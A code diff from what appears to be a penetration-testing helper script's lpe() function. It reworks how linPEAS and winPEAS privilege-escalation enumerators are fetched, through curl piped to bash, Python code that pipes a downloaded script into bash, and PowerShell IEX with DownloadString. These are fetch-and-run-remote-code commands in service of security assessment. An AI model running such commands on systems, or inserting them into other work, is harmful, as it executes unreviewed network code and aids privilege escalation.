@@ -690,18 +690,28 @@ lpe() {
             echo -e "${CB}Linux detected. Running linPEAS...${CN}"
             # Try to use curl first
             if command -v curl >/dev/null 2>&1; then
-                echo -e "${CB}Using curl to download linPEAS...${CN}"
-                curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+                echo -e "${CB}Using curl to download and execute linPEAS...${CN}"
+                curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash
             elif command -v python >/dev/null 2>&1; then
-                echo -e "${CB}Using python to download linPEAS...${CN}"
-                python -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
-                sh linpeas.sh
+                echo -e "${CB}Using python to download and execute linPEAS...${CN}"
+                python -c "
+import urllib.request
+import subprocess
+url = 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh'
+script_content = urllib.request.urlopen(url).read().decode('utf-8')
+subprocess.run(['bash'], input=script_content.encode('utf-8'))
+                "
             elif command -v python3 >/dev/null 2>&1; then
-                echo -e "${CB}Using python3 to download linPEAS...${CN}"
-                python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
-                sh linpeas.sh
+                echo -e "${CB}Using python3 to download and execute linPEAS...${CN}"
+                python3 -c "
+import urllib.request
+import subprocess
+url = 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh'
+script_content = urllib.request.urlopen(url).read().decode('utf-8')
+subprocess.run(['bash'], input=script_content.encode('utf-8'))
+                "
             else
-                echo -e "${CR}Error: Neither curl nor python/python3 is available to download linPEAS.${CN}"
+                echo -e "${CR}Error: Neither curl nor python/python3 is available to download and execute linPEAS.${CN}"
                 return 1
             fi
             ;;
@@ -709,18 +719,28 @@ lpe() {
             echo -e "${CB}macOS detected. Running linPEAS...${CN}"
             # macOS is Unix-based, so it can use linPEAS like Linux
             if command -v curl >/dev/null 2>&1; then
-                echo -e "${CB}Using curl to download linPEAS...${CN}"
-                curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+                echo -e "${CB}Using curl to download and execute linPEAS...${CN}"
+                curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash
             elif command -v python >/dev/null 2>&1; then
-                echo -e "${CB}Using python to download linPEAS...${CN}"
-                python -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
-                sh linpeas.sh
+                echo -e "${CB}Using python to download and execute linPEAS...${CN}"
+                python -c "
+import urllib.request
+import subprocess
+url = 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh'
+script_content = urllib.request.urlopen(url).read().decode('utf-8')
+subprocess.run(['bash'], input=script_content.encode('utf-8'))
+                "
             elif command -v python3 >/dev/null 2>&1; then
-                echo -e "${CB}Using python3 to download linPEAS...${CN}"
-                python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
-                sh linpeas.sh
+                echo -e "${CB}Using python3 to download and execute linPEAS...${CN}"
+                python3 -c "
+import urllib.request
+import subprocess
+url = 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh'
+script_content = urllib.request.urlopen(url).read().decode('utf-8')
+subprocess.run(['bash'], input=script_content.encode('utf-8'))
+                "
             else
-                echo -e "${CR}Error: Neither curl nor python/python3 is available to download linPEAS.${CN}"
+                echo -e "${CR}Error: Neither curl nor python/python3 is available to download and execute linPEAS.${CN}"
                 return 1
             fi
             ;;
@@ -728,7 +748,7 @@ lpe() {
             echo -e "${CB}Windows detected. Running winPEAS...${CN}"
             if command -v powershell >/dev/null 2>&1; then
                 echo -e "${CB}Using PowerShell to download and execute winPEAS...${CN}"
-                powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"
+                powershell -Command "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"
             else
                 echo -e "${CR}Error: PowerShell is not available to run winPEAS.${CN}"
                 return 1
